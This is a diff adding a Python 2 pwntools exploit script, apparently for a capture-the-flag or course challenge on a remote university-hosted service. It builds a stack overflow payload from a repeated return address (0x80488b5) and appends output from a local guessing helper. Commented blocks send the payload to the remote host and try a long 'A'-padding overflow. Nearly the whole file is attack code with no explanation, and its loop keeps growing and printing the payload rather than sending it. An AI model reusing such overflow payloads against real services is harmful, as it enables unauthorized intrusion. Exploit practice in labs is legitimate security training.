@@ -1,0 +1,47 @@
+#!/usr/bin/env python2
+
+from pwn import *
+from subprocess import check_output
+import os
+import struct
+
+#stack = 0xffffca74
+ret = 0x80488b5
+
+payload = ""
+temp = ""
+for i in range(280):
+    temp += struct.pack("I", ret)
+#for i in range(20):
+#    payload += struct.pack("I", stack)
+#payload += "\xb5\x88\x04\x08"*260
+#main = 80488b5
+#gets 80488ca
+# sp 0xffffc870
+#payload += "0x1"
+
+#r = remote("hexhivepc1.epfl.ch", 10004)
+
+
+while(True):
+    payload += temp
+    payload += "\n"
+    payload += check_output(["./my_guess"])
+    print(payload)
+
+
+#while (True):
+#    r.sendline(payload)
+#    print(r.recvline())
+#    guess = check_output(["./my_guess"])
+#    r.sendline(guess)
+#    print(r.recvall())
+
+
+#payload = ""
+#payload += "A"*0x400
+#payload += "0x1"
+#r.sendline(payload)
+#print(r.recvline())
+#r.sendline("WOOOW")
+#print(r.recvall())
